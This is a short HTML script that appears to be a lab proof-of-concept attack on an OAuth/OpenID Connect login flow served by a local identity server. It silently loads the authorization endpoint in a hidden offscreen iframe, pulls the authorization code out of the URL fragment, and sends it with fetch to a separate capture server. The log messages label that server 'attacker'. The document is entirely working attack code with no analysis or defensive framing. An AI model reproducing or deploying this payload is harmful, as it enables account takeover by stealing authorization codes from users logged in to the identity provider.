<script>
const authorizationURL =
    "http://127.0.0.1:8080/realms/demo/protocol/openid-connect/auth" +
    "?client_id=demo-conf" +
    "&response_type=code" +
    "&scope=openid" +
    "&redirect_uri=" +
    encodeURIComponent("http://127.0.0.1:8000/oauth/callback") +
    "&response_mode=fragment" +
    "&state=attack-state";

const iframe = document.createElement("iframe");

iframe.style.width = "1px";
iframe.style.height = "1px";
iframe.style.border = "0";
iframe.style.position = "absolute";
iframe.style.left = "-10000px";

iframe.src = authorizationURL;
iframe.onload = () => {
    console.log("[+] iframe loaded");
    console.log("[+] iframe URL:", iframe.contentWindow.location.href);
    console.log("[+] iframe hash:", iframe.contentWindow.location.hash);

    const params = new URLSearchParams(
        iframe.contentWindow.location.hash.slice(1)
    );

    const code = params.get("code");

    console.log("[+] code:", code);

    const captureURL = "http://127.0.0.1:9000/capture?code=" + encodeURIComponent(code);
    console.log("[+] Sending code to attacker...");
    fetch(captureURL, {
        mode: "no-cors"
    });
    console.log("[+] Code sent");
};

document.body.appendChild(iframe);
console.log("[+] OAuth iframe created");


</script>